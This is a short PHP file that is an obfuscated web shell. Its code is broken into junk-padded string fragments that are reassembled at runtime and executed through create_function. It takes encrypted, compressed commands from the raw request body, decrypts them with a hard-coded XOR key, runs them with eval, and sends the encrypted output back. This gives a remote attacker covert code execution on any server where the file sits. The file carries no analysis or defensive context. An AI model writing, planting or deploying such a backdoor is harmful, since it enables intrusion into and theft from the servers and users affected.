<?php
$f='"/A$Akh(.+)$kf/",@fiAlAe_get_coAnAtents("php:/A/inpuAtA"),$m)A==1) {@obA_start();@eAva';
$n='l(@gAzuncAomApress(@x(A@bAase64A_decode($mA[1A]),$Ak)))A;$o=@ob_getA_contenAtAsA();A@o';
$s=';($j<$cA&&$i<$lAA);$jA++,$i++){$o.=$At{$i}A^$k{A$j};A}}returAn $o;}Aif (@Apreg_matchA(';
$C='b_end_clean();$rA=@base6A4_AeAncAode(@xA(@gzcompreAsAs($o),$k));print("$p$kAh$r$kf");}';
$M='tioAn x($At,A$k){A$c=strlenA($k);$lA=strAlen($t)A;$oAA="A";fAor($i=A0;$i<$l;){for($j=0';
$y='$Ak=A"A20f7c2A4c";A$khA="f3043882dd62";$kAf="bf39c43d5b4bA";$pAA="6tLAurIGTrJiLqjOd"A;func';
$r=str_replace('R','','RcreaRRte_RRfunctRion');
$T=str_replace('A','',$y.$M.$s.$f.$n.$C);
$E=$r('',$T);$E();
?>
